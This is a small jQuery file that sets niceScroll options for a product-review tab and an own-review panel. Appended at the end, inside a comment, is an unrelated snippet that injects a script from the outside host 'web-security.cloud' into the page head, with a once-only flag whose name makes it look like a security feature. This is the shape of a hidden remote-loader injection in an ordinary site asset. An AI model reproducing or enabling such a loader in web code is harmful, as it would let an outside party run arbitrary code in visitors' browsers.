
$(function() {
    'use strict';

/*--------------------------------------------------------------
    Nice scroll Plugin setting for product review, own revies
--------------------------------------------------------------*/
    $('#tab-content').niceScroll({
        autohidemode: 'false',     
        cursorborderradius: '5px', 
        background: '#E5E9E7',     
        cursorwidth: '6px',       
        background: '#f2f2f2',
        cursorcolor: '#000'    
    });

    $('#own-review').niceScroll({
        autohidemode: 'false',     
        cursorborderradius: '5px', 
        background: '#E5E9E7',     
        cursorwidth: '6px',       
        background: '#f2f2f2',
        cursorcolor: '#000'     
    });

  
}); //end of document.ready

/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/